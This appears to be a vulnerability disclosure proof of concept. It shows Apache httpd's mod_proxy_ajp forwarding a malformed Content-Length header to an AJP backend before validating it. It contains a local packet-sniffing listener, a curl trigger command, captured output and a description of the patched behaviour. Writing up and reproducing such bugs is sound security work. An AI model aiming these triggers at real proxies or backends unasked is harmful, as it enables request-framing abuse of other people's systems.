# PoC 068 - Malformed Content-Length Forwarded to AJP Backend Before Validation

`mod_proxy_ajp` calls `ajp_send_header()` before validating
`Content-Length`. A malformed value reaches the backend in the AJP request
header packet, even though the proxy then replies `400` to the client.

## Setup

Vulnerable httpd 2.4.66 plus a tiny AJP listener that records every byte it
receives.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule proxy_module       modules/mod_proxy.so
LoadModule proxy_ajp_module   modules/mod_proxy_ajp.so

ProxyPass        /app  ajp://127.0.0.1:8009/app
ProxyPassReverse /app  ajp://127.0.0.1:8009/app
```

AJP listener that decodes incoming request packets and prints the
`SC_REQ_CONTENT_LENGTH` value (header code `0xA0 0x08`):

```python
# /tmp/poc068/ajp_sniff.py
import socket, struct
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 8009)); s.listen(1)
print("ajp_sniff listening on 8009")
c, _ = s.accept()
def readn(n):
    b = b""
    while len(b) < n:
        b += c.recv(n - len(b))
    return b
magic = readn(4)
assert magic[:2] == b"\x12\x34", magic
plen  = struct.unpack("!H", magic[2:4])[0]
pkt   = readn(plen)
print("ajp packet hex:", pkt.hex())
# Look for compact header 0xA008 (Content-Length) followed by length+value
i = pkt.find(b"\xA0\x08")
if i >= 0:
    vlen = struct.unpack("!H", pkt[i+2:i+4])[0]
    print("forwarded Content-Length =", pkt[i+4:i+4+vlen])
c.close()
```

## Trigger

```
python3 /tmp/poc068/ajp_sniff.py &
httpd -X -f $PWD/conf/httpd.conf &

# Send a malformed Content-Length. printf -ed body keeps the request well-formed
# at the HTTP layer, so the request reaches the AJP path.
printf '' | curl -sS -i \
    -H 'Content-Length: abc' \
    -H 'Content-Type: text/plain' \
    --data-binary @- \
    http://127.0.0.1:8080/app/x
```

## Observed effect

`ajp_sniff.py` prints the AJP request packet **before** httpd answers the
client; the dump includes the malformed header value:

```
ajp packet hex: 02 02 ... A0 08 00 03 61 62 63 ...
forwarded Content-Length = b'abc'
```

(`A008` is `SC_REQ_CONTENT_LENGTH`, then 3-byte length, then ASCII `abc`.)

After the packet is on the wire, the proxy continues into
`get_content_length(r)`, which returns -1, sets `status = APR_EINVAL`, and
returns `HTTP_BAD_REQUEST` to the client. The client therefore sees
`HTTP/1.1 400 Bad Request`, but the backend has already received an
attacker-controlled malformed framing header. With the patch applied,
`get_content_length()` runs first, the function returns
`HTTP_BAD_REQUEST` immediately, and `ajp_sniff.py` never sees a packet.
